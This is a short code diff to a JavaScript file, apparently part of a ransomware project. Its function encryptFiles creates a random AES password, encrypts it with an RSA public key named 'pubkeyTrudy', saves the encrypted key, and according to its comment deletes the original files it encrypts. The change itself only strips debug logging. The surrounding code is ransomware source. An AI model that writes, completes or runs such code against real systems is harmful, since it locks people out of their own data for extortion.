@@ -47,15 +47,11 @@ pubkeyRSA.importKey(pubkeyTrudy,'public');
  * Deletes the original file that is being encrypted.
  */
 function encryptFiles(){
-  console.log("DUDE ITS RUNNING!!!");
-  console.log(pubkeyRSA);
+
   // Secure Random generator for key for AES-192
   var secureRandom = require('secure-random-string');
   var password = secureRandom(64);
 
-  //console.log(`Print out ursa: ${ursa}`);
-
-  //var pubkey = ursa.createPublicKey(pubkeyTrudy);
   encryptedKey = pubkeyRSA.encrypt(password, 'base64');
 
   // Saving the encrypted key for later use. Incase the program shuts off.
